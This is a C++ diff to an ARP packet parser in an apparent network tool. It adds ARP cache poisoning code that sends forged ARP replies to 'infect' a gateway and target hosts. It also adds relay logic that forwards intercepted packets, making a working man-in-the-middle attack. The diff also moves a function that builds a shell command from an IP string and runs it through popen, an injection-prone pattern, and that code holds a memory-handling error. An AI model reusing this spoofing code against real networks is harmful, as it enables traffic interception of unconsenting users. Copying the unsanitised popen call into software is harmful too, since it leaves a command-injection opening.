@@ -39,28 +39,6 @@ bool DHCPParser::parse(WPacket& packet)
     return true;
 }
 
-void ARPParser::findName(){
-    GTRACE("%s", std::string(g.mac_).data());
-    std::string fname = "nmblookup -A ";
-    std::string fullname = fname + std::string(g.ip_);
-    FILE *fp = popen(fullname.c_str(), "r");
-
-    if(fp == NULL){
-        perror("popen() fail");
-        exit(1);
-    }
-
-    char buf[1024];
-    fgets(buf, 1024, fp);
-    if(fgets(buf, 1024, fp)){
-        std::string str(strtok(buf, " "));
-        str.erase(str.begin());
-        g.name = (char*)malloc(sizeof(char) * str.size());
-        g.name = str;
-        GTRACE("%s", str.data());
-    }
-}
-
 bool ARPParser::parse(WPacket& packet) //arp packet parsing
 {
     WMac my_mac;
@@ -74,20 +52,44 @@ bool ARPParser::parse(WPacket& packet) //arp packet parsing
         gateway = packet_instance.intf()->gateway();
     }
 
-    if(packet.ethHdr_->type() != WEthHdr::Arp) {return false;}
-    if(packet.ethHdr_->smac() == my_mac) {return false;}
+    ARPPacket arppacket_;
+    if(packet.ethHdr_->type() != WEthHdr::Arp) { return false; }
+    if(packet.arpHdr_->sip() == arppacket_.gate_ip){
+        nbInstance.setGateMac(packet.ethHdr_->smac());
+        GTRACE("GATEWAY MAC = %s",std::string(nbInstance.getGateMac()).data());
+        return false;
+    }
 
-    GTRACE("mac: %s, ip: %s", std::string(packet.ethHdr_->smac()).data(), std::string(packet.arpHdr_->sip()).data());
+    //relay
+    if(packet.ethHdr_->dmac() == my_mac) {
+        if(packet.arpHdr_->tip() == gateway) { //packet from target
+            #ifdef Q_OS_WIN
+            if(packet.ethHdr_->smac() == packet.ethHdr_->dmac()) {
+                packet.ethHdr_->dmac() = nbInstance.getGateMac();
+                packet_instance.write(&packet);
+            }
+            #endif
+            #ifdef Q_OS_LINUX
+            if(nbInstance.nbMap.find(packet.ethHdr_->smac()) == nbInstance.nbMap.end()) {//not infection target
+                GTRACE("\n\nWOWOWOW");
+                packet.ethHdr_->dmac() = nbInstance.getGateMac();
+                packet_instance.write(&packet);
+            }
+            #endif
+        }
+        return false;
+    }
 
-    if((packet.arpHdr_->sip() & mask) == (gateway & mask) && packet.arpHdr_->sip() != gateway) {
-        g.mac_ = packet.ethHdr_->smac();//get mac
+    GTRACE("-----------<full scan>");
+    GTRACE("%s", std::string(packet.arpHdr_->sip()).data());
+    if((packet.arpHdr_->sip() & mask) == (gateway & mask)) {
+        g.mac_ = packet.arpHdr_->smac();//get mac
         g.ip_ = packet.arpHdr_->sip(); //get ip
         gettimeofday(&g.last, NULL);
 
-        GTRACE("<full scan>");
         GTRACE("%s", std::string(g.mac_).data());
         GTRACE("%s", std::string(g.ip_).data());
-
+        GTRACE("%d",g.last.tv_sec);
         std::map<WMac, Host>::iterator iter = fs.getFsMap().find(g.mac_);
         if(iter != fs.getFsMap().end()) {
             GTRACE("already info mac: %s, ip: %s", std::string(g.mac_).data(), std::string(g.ip_).data());
@@ -98,6 +100,11 @@ bool ARPParser::parse(WPacket& packet) //arp packet parsing
             fs.addHost(std::pair<WMac,Host>(g.mac_, g)); //insert into fs_map
         }
     }
+
+    if(packet.ethHdr_->smac() == packet.ethHdr_->dmac()) {
+        packet_instance.write(&packet);
+    }
+
     return true;
 }
 
@@ -121,19 +128,44 @@ void ARPParser::parse(WPacket& packet, std::map<WMac, Host> nb_map) {
             if(iter != nb_map.end()) {
                 GTRACE("have nb list");
                 WMac my_mac;
+
                 {
                     std::lock_guard<std::mutex> lock(packet_instance.m);
                     my_mac = packet_instance.intf()->mac();
                 }
+
                 // Infect gateway
-                arp_packet.makeArppacket(arp_packet.gate_mac, my_mac, arp_packet.gate_mac, arp_packet.gate_ip, packet.arpHdr_->tip());
+                arp_packet.makeArppacket(nbInstance.getGateMac(), my_mac, nbInstance.getGateMac(), arp_packet.gate_ip, packet.arpHdr_->tip());
                 arp_packet.packet.arp.op_ = htons(WArpHdr::Reply);
-                arp_packet.send(3);
+                arp_packet.send(nbInstance.sendInfectNum);
+
                 // Infect Host
                 arp_packet.makeArppacket(g.mac_, my_mac, g.mac_, g.ip_, arp_packet.gate_ip);
                 arp_packet.packet.arp.op_ = htons(WArpHdr::Reply);
-                arp_packet.send(3);
+                arp_packet.send(nbInstance.sendInfectNum);
             }
         }
+    }
+}
+
+void ARPParser::findName(){
+    GTRACE("%s", std::string(g.mac_).data());
+    std::string fname = "nmblookup -A ";
+    std::string fullname = fname + std::string(g.ip_);
+    FILE *fp = popen(fullname.c_str(), "r");
+
+    if(fp == NULL){
+        perror("popen() fail");
+        exit(1);
+    }
+
+    char buf[1024];
+    fgets(buf, 1024, fp);
+    if(fgets(buf, 1024, fp)){
+        std::string str(strtok(buf, " "));
+        str.erase(str.begin());
+        g.name = (char*)malloc(sizeof(char) * str.size());
+        g.name = str;
+        GTRACE("%s", str.data());
     }
 }
